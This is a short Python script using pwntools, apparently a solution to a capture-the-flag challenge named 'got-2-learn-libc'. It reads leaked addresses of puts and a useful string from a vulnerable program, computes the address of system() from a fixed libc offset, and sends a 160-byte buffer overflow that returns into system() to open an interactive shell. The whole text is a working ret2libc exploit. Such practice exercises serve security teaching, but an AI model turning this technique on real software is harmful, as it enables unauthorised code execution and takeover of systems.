from pwn import *

proc = process('/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln')

offset = -149504

proc.recvuntil('puts: ')
puts = int(proc.recv(10), 16)
proc.recvuntil('useful_string: ')
useful = int(proc.recv(10), 16)

system = puts + offset

print puts
print system

string = 'a'*160
string += p32(system)
string += 'aaaa'
string += p32(useful)

proc.sendline(string)
proc.interactive()
